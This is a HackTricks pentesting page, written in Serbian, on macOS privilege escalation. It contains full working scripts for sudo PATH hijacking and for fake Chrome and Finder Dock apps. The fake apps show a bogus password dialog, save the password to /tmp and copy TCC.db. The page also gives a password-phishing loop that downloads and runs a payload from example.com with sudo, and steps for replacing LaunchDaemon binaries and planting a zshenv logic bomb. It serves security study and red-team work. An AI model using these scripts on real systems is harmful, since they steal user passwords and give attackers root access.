# macOS Eskalacija privilegija

{{#include ../../banners/hacktricks-training.md}}

## TCC eskalacija privilegija

Ako ste ovde došli tražeći TCC eskalaciju privilegija, idite na:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Mnoge tehnike eskalacije privilegija koje utiču na Linux ili druge sisteme slične Unixu primenljive su i na macOS. Pogledajte:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interakcija sa korisnikom

### Sudo Hijacking

Originalnu [Sudo Hijacking tehniku možete pronaći u objavi o eskalaciji privilegija u Linuxu](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Međutim, macOS **zadržava** korisnikov **`PATH`** kada izvršava **`sudo`**. To znači da se ovaj napad može izvesti i **otimanjem drugih binarnih datoteka** koje žrtva ipak izvršava prilikom **pokretanja komande sudo:**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Imajte na umu da je velika verovatnoća da korisnik koji koristi terminal ima **instaliran Homebrew**. Zato je moguće preuzeti kontrolu nad binarnim datotekama u **`/opt/homebrew/bin`**.

### Imitiranje Dock-a

Uz malo **social engineering** tehnika možete da se **predstavite kao, na primer, Google Chrome** u Dock-u i zapravo pokrenete svoju skriptu:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Nekoliko predloga:

- Proverite da li je Chrome u Dock-u i, ako jeste, **uklonite** taj unos i **dodajte** **lažni** unos za **Chrome na istu poziciju** u nizu Dock-a.

<details>
<summary>Skripta za imitiranje Chrome-a u Dock-u</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Neki predlozi:

- **Ne možete ukloniti Finder iz Dock-a**, pa ako ćete ga dodati u Dock, možete postaviti lažni Finder odmah pored pravog. Da biste to uradili, morate **dodati lažni Finder na početak niza Dock-a**.
- Druga opcija je da ga ne postavite u Dock, već samo da ga otvorite; „Finder traži dozvolu da kontroliše Finder“ nije toliko neobično.
- Još jedna opcija za **eskalaciju privilegija na root bez traženja** lozinke uz grozan dijalog jeste da Finder zaista zatraži lozinku za izvršavanje privilegovane radnje:
  - Zatražite od Finder-a da kopira novu datoteku **`sudo`** u **`/etc/pam.d`** (u promptu za lozinku pisalo bi da „Finder želi da kopira sudo“)
  - Zatražite od Finder-a da kopira novi **Authorization Plugin** (možete kontrolisati ime datoteke, tako da bi u promptu za lozinku pisalo da „Finder želi da kopira Finder.bundle“)

<details>
<summary>Skripta za lažno predstavljanje Finder-a u Dock-u</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware često zloupotrebljava interakciju korisnika da bi **uhvatio lozinku koja omogućava korišćenje sudo-a** i ponovo je upotrebio programski. Uobičajen tok:

1. Identifikovati prijavljenog korisnika pomoću `whoami`.
2. **Ponavljati upite za lozinku** dok `dscl . -authonly "$user" "$pw"` ne vrati uspešan rezultat.
3. Keširati akreditive (npr. `/tmp/.pass`) i izvršavati privilegovane radnje pomoću `sudo -S` (lozinka preko standardnog ulaza).

Primer minimalnog niza:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

Ukradena lozinka se zatim može ponovo upotrebiti za **uklanjanje Gatekeeper karantina pomoću `xattr -c`**, kopiranje LaunchDaemons ili drugih privilegovanih datoteka i neinteraktivno pokretanje dodatnih faza.<sup>[[1]](#references)</sup>

#### Provera uhvaćenih lozinki putem PAM-a

Prompt za unos sigurnog teksta koji izgleda kao izvorni može prikupiti lozinku naloga i proveriti je u istom procesu putem PAM-a, umesto pokretanja `dscl`, `security` ili `osascript`. Pozivalac započinje PAM transakciju pomoću `pam_start`, prosleđuje lozinku putem callback funkcije za komunikaciju, poziva `pam_authenticate` i zatvara transakciju pomoću `pam_end`. Neuspešna provera može vratiti korisnika na polje za lozinku; uspešna provera potvrđuje lozinku bez pokretanja zasebnog procesa za verifikaciju. Sama PAM autentifikacija **ne** podiže privilegije pozivaoca niti ovlašćuje privilegovane operacije.<sup>[[9]](#references)[[10]](#references)</sup>

Ako se lozinke za prijavu i Keychain podudaraju, uhvaćena lozinka može se koristiti i za operacije koje zahtevaju trenutnu Keychain lozinku; pogledajte [ograničenja ACL-a i liste particija za Keychain](../macos-red-teaming/macos-keychain.md).<sup>[[10]](#references)</sup>

## Noviji vektori specifični za macOS (2023–2026)

### Zastareli `AuthorizationExecuteWithPrivileges` i dalje se može koristiti

`AuthorizationExecuteWithPrivileges` je zastareo od verzije 10.7, ali **i dalje radi na Sonoma/Sequoia**. Mnogi komercijalni programi za ažuriranje pokreću `/usr/libexec/security_authtrampoline` sa nepouzdanom putanjom. Ako korisnik može da upisuje u ciljnu binarnu datoteku, možete postaviti trojan i iskoristiti legitimni prompt:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Kombinujte sa **trikovima za maskiranje iznad** kako biste prikazali uverljiv dijalog za lozinku.


### Trijaža privilegovanih pomoćnih programa / XPC

Mnogi moderni privescs u macOS-u koje izazivaju third-party softver prate isti obrazac: **root LaunchDaemon** izlaže **Mach/XPC servis** iz direktorijuma **`/Library/PrivilegedHelperTools`**, a zatim pomoćni program ili **ne proverava klijenta**, proverava ga **prekasno** (PID race) ili izlaže **root metodu** koja koristi **putanju/skriptu pod kontrolom korisnika**. Ovo je klasa grešaka koja stoji iza mnogih nedavnih ranjivosti pomoćnih programa u VPN klijentima, pokretačima igara i programima za ažuriranje.<sup>[[2]](#references)</sup>

Brza kontrolna lista za trijažu:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Posebnu pažnju obratite na helpere koji:

- nastavljaju da prihvataju zahteve **nakon deinstalacije** jer je job ostao učitan u `launchd`
- izvršavaju skripte ili čitaju konfiguraciju iz putanja kao što je **`/Applications/...`** ili drugih putanja u koje mogu da upisuju korisnici koji nisu root
- oslanjaju se na proveru peer-a zasnovanu na **PID-u** ili samo na **bundle-id-u**, koja može biti podložna race uslovima

Više detalja o greškama u autorizaciji helpera potražite na [ovoj stranici](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Nasleđivanje okruženja skripti PackageKit-a (CVE-2024-27822)

Pre nego što je Apple ispravio ovaj problem u verzijama **Sonoma 14.5**, **Ventura 13.6.7** i **Monterey 12.7.5**, instalacije koje je korisnik pokrenuo preko **`Installer.app`** / **`PackageKit.framework`** mogle su da izvrše **PKG skripte kao root u okruženju trenutnog korisnika**. To znači da bi paket koji koristi **`#!/bin/zsh`** učitao napadačev **`~/.zshenv`** i pokrenuo ga kao **root** kada žrtva instalira paket.<sup>[[3]](#references)</sup>

Ovo je posebno zanimljivo kao **logic bomb**: potrebni su vam samo početni pristup korisničkom nalogu i shell startup fajl u koji možete da upisujete, a zatim čekate da korisnik pokrene bilo koji ranjivi instalacioni program zasnovan na **zsh-u**. Ovo se uglavnom **ne** odnosi na primene preko **MDM/Munki**, jer se one izvršavaju u okruženju root korisnika.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Ako želite detaljnije da istražite zloupotrebu specifičnu za instalatore, pogledajte i [ovu stranicu](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Kolizija odredišta instalatora preko `.localized`

Neki instalatori trećih strana registruju root LaunchDaemon čija je izvršna datoteka navedena fiksnom putanjom unutar `/Applications/Target.app`. Ako napadač može prvi da kreira taj bundle sa **drugačijim identifikatorom bundle-a**, Installer može da sačuva mamac i smesti pravu aplikaciju u `/Applications/Target.localized/Target.app`. Daemon i dalje pokazuje na prvobitnu putanju. Zato izvršna datoteka pod kontrolom napadača, smeštena unutar mamac-bundle-a, kasnije može da se pokrene kao root.<sup>[[8]](#references)</sup>

Važni preduslovi su:<sup>[[8]](#references)</sup>

1. Napadač može da kreira ili kontroliše očekivanu putanju aplikacije.
2. Paket ne uklanja konfliktni bundle.
3. Privilegovani posao koristi hardkodiranu putanju unutar tog bundle-a.
4. Korisnik ili MDM tok rada instalira paket i registruje posao.

Potražite premeštene bundle-ove, a zatim pregledajte ciljeve LaunchDaemon-a pomoću enumeracione petlje u sledećem odeljku:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Bezbedniji installer razrešava konačnu lokaciju bundle-a i čuva privilegovane izvršne datoteke na lokaciji u vlasništvu root-a, kao što je `/Library/PrivilegedHelperTools`. Takođe treba da proveri vlasništvo i potpis koda pre registrovanja ili pokretanja job-a.<sup>[[8]](#references)</sup>

### Hijack upisivog cilja LaunchDaemon-a

plist za LaunchDaemon može biti u vlasništvu root-a, dok `Program` ili prvi unos u `ProgramArguments` upućuje na direktorijum u koji korisnik može da upisuje. Proverite **celu putanju**, a ne samo dozvole izvršne datoteke. Ako je nadređeni direktorijum upisiv, napadač može da preimenuje izvršnu datoteku u vlasništvu root-a i na istu putanju postavi zamenu. Zamena se pokreće kao root pri sledećem pokretanju job-a. Dovoljan je restart sistema ili uobičajeno ponovno pokretanje servisa. Napadaču nije potrebna dozvola da pokrene `launchctl bootstrap` u sistemskom domenu.<sup>[[7]](#references)</sup>

Prvo izlistajte svako odredište i njegov neposredno nadređeni direktorijum:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Kada su datoteka ili njen nadređeni direktorijum upisivi, sačuvajte originalni binary i zamenite putanju izvršnim payload-om. Zatim sačekajte da se već učitani daemon ponovo pokrene.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU SMR trka oko pokazivača credentials (CVE-2025-24118)

Ranjiva putanja `kauth_cred_proc_update` ažurirala je `proc_ro.p_ucred` pomoću neatomskog API-ja `zalloc_ro_mut`, dok su SMR čitači učitavali pokazivač bez zaključavanja. Javni okidač koristi posebno pripremljenu setgid binarnu datoteku. Jedna nit naizmenično menja svoj stvarni i efektivni ID grupe, dok druga nit neprekidno poziva sistemski poziv kao što je `getgid()`.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Tretirajte ovo kao **race primitive**, a ne kao gotov root exploit. Objavljeni PoC demonstrira pokvareni pokazivač na kredencijale. Često se završava panic-om kernela. Istraživač je reprodukovao korupciju samo na Intel-u i nije omogućio determinističku kontrolu nad rezultujućim objektom kredencijala. Apple je u macOS 15.3 promenio ažuriranje tako da koristi atomsku zamenu pokazivača.<sup>[[4]](#references)</sup>

### SIP bypass preko Migration assistant („Migraine“, CVE-2023-32369)

Čak i ako već imate root, SIP i dalje blokira upisivanje na sistemske lokacije. Greška **Migraine** zloupotrebljava Migration Assistant entitlement `com.apple.rootless.install.heritable` kako bi pokrenula podređeni proces koji nasleđuje SIP bypass i prepisuje zaštićene putanje (npr. `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Lanac:

1. Dobijte root na aktivnom sistemu.
2. Aktivirajte `systemmigrationd` pomoću posebno pripremljenog stanja tako da pokrene binarnu datoteku koju kontroliše napadač.
3. Iskoristite nasleđeni entitlement da izmenite datoteke zaštićene SIP-om, uz zadržavanje izmena i nakon ponovnog pokretanja.

### NSPredicate/XPC krijumčarenje izraza (klasa grešaka CVE-2023-23530/23531)

Više Apple daemon-a prihvata **NSPredicate** objekte preko XPC-a i proverava samo polje `expressionType`, koje kontroliše napadač. Kreiranjem predikata koji izvršava proizvoljne selektore možete postići **izvršavanje koda u root/system XPC servisima** (npr. `coreduetd`, `contextstored`). U kombinaciji sa početnim zaobilaženjem app sandbox-a, ovo omogućava **eskalaciju privilegija bez upita korisniku**. Potražite XPC endpoint-e koji deserijalizuju predikate, a nemaju robusnu visitor implementaciju.<sup>[[6]](#references)</sup>

## TCC - Eskalacija root privilegija

### CVE-2020-9771 - TCC bypass i eskalacija privilegija preko mount_apfs

**Bilo koji korisnik** (čak i oni bez privilegija) može da kreira i montira Time Machine snimak stanja pomoću `-o noowners` i **pristupi SVIM datotekama** tog snimka, zaobilazeći provere vlasništva na aktivnom volumenu. Jedina potrebna privilegija je da aplikacija koja se koristi (kao što je `Terminal`) ima **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Komande i kompletno objašnjenje nalaze se na stranici TCC bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Osetljive informacije

Ovo može biti korisno za eskalaciju privilegija:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Pentest Partners - 2025, godina Infostealer-a](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: AWS Client VPN za macOS — lokalna eskalacija privilegija](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: eskalacija privilegija preko macOS PackageKit-a](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft „Migraine“ SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Nova klasa grešaka za eskalaciju privilegija na macOS-u i iOS-u (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Otmica LaunchDaemon-a: eskalacija privilegija i postojanost kroz nebezbedne dozvole fascikli](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE preko direktorijuma .localized](https://theevilbit.github.io/posts/localized/)
- [9] [Jamf Threat Labs - PamStealer: macOS malware koji se predstavlja kao aplikacija za upravljanje clipboard-om](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
- [10] [Kaspersky Securelist - MacSync pod lupom](https://securelist.com/macsync-new-version/121383/)
